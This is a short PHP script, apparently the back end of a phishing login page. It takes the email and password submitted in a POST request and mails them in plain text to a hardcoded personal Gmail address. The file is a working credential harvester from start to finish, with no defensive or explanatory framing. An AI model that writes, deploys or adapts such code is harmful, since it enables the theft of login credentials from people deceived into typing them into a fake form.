<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Get email and password from POST request
    $email = $_POST['email'];
    $password = $_POST['password'];

    // Your email where the login info will be sent
    $to = "ajmirahemed5@gmail.com";
    $subject = "User Login Information";
    $message = "Email: $email\nPassword: $password";
    $headers = "From: noreply@yourdomain.com"; // Change this to your domain email

    // Send the email
    if (mail($to, $subject, $message, $headers)) {
        echo "Login information sent successfully.";
    } else {
        echo "Error sending login information.";
    }
} else {
    // If accessed with a method other than POST
    http_response_code(405); // Method Not Allowed
    echo "Method not allowed.";
}
?>
